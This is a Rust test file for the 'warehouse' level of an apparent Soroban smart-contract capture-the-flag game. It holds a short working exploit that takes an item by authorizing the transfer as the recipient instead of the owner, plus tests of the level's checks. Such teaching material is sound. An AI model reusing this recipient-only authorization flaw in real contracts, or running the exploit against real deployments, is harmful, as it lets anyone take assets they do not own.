use crate::harness::{auth, contract_error, errors, LevelSpec, Scenario};
use soroban_sdk::{contractclient, Address, Env, IntoVal};

pub const SPEC: LevelSpec = LevelSpec {
    id: 3,
    slug: "warehouse",
    interface: &[
        "__constructor",
        "item_id",
        "owner",
        "owner_of",
        "player",
        "recipient",
        "transfer_item",
    ],
};

#[allow(dead_code)]
#[contractclient(name = "WarehouseClient")]
pub trait WarehouseInterface {
    fn transfer_item(env: Env, owner: Address, recipient: Address, item_id: u32);
    fn owner_of(env: Env, item_id: u32) -> Address;
}

fn transfer(c: &Scenario, instance: &Address, owner: &Address, recipient: &Address, item_id: u32) {
    WarehouseClient::new(&c.env, instance)
        .mock_auths(&[auth(
            recipient,
            instance,
            "transfer_item",
            (owner.clone(), recipient.clone(), item_id).into_val(&c.env),
        )])
        .transfer_item(owner, recipient, &item_id);
}

fn try_transfer(
    c: &Scenario,
    instance: &Address,
    owner: &Address,
    recipient: &Address,
    item_id: u32,
) -> bool {
    WarehouseClient::new(&c.env, instance)
        .mock_auths(&[auth(
            recipient,
            instance,
            "transfer_item",
            (owner.clone(), recipient.clone(), item_id).into_val(&c.env),
        )])
        .try_transfer_item(owner, recipient, &item_id)
        .is_ok()
}

pub(crate) fn exploit(c: &Scenario, instance: &Address, player: &Address) {
    transfer(c, instance, instance, player, 17);
}

#[test]
fn the_objective_is_not_met_at_the_start() {
    let c = Scenario::new();
    let warehouse = c.create_instance(&c.player, SPEC.id);

    assert_eq!(
        WarehouseClient::new(&c.env, &warehouse).owner_of(&17u32),
        warehouse,
        "the item starts with the warehouse, which never signs"
    );
    assert_ne!(
        WarehouseClient::new(&c.env, &warehouse).owner_of(&17u32),
        c.player
    );

    assert_eq!(
        c.submit(&c.player, &warehouse),
        Err(contract_error(errors::OBJECTIVE_NOT_MET)),
        "the item must not start with the player"
    );
}

#[test]
fn the_exploit_takes_the_item_by_authorizing_as_the_recipient() {
    let c = Scenario::new();
    let warehouse = c.create_instance(&c.player, SPEC.id);

    exploit(&c, &warehouse, &c.player);

    assert_eq!(
        WarehouseClient::new(&c.env, &warehouse).owner_of(&17u32),
        c.player,
        "the item moved to the player"
    );
    assert_eq!(c.submit(&c.player, &warehouse), Ok(()));
    assert!(c.is_completed(&c.player, SPEC.id));
}

#[test]
fn naming_the_wrong_owner_does_not_move_the_item() {
    let c = Scenario::new();
    let warehouse = c.create_instance(&c.player, SPEC.id);

    assert!(
        !try_transfer(&c, &warehouse, &c.other, &c.player, 17),
        "the stored owner is the warehouse, not an arbitrary address"
    );
    assert_eq!(
        WarehouseClient::new(&c.env, &warehouse).owner_of(&17u32),
        warehouse
    );
}

#[test]
fn the_recipient_must_authorize_the_transfer() {
    let c = Scenario::new();
    let warehouse = c.create_instance(&c.player, SPEC.id);

    let result =
        WarehouseClient::new(&c.env, &warehouse).try_transfer_item(&warehouse, &c.other, &17u32);
    assert!(
        result.is_err(),
        "without the recipient's signature, the contract must refuse"
    );
    assert_eq!(
        WarehouseClient::new(&c.env, &warehouse).owner_of(&17u32),
        warehouse
    );
}

#[test]
fn submitting_twice_is_refused() {
    let c = Scenario::new();
    let warehouse = c.create_instance(&c.player, SPEC.id);
    exploit(&c, &warehouse, &c.player);

    assert_eq!(c.submit(&c.player, &warehouse), Ok(()));
    assert_eq!(
        c.submit(&c.player, &warehouse),
        Err(contract_error(errors::ALREADY_COMPLETED))
    );
}

#[test]
fn an_instance_the_core_did_not_create_is_refused() {
    let c = Scenario::new();
    let foreign = crate::harness::register(&c.env, &SPEC.instance_wasm(), (c.player.clone(),));

    exploit(&c, &foreign, &c.player);
    assert_eq!(
        WarehouseClient::new(&c.env, &foreign).owner_of(&17u32),
        c.player
    );

    assert_eq!(
        c.submit(&c.player, &foreign),
        Err(contract_error(errors::UNKNOWN_INSTANCE))
    );
}
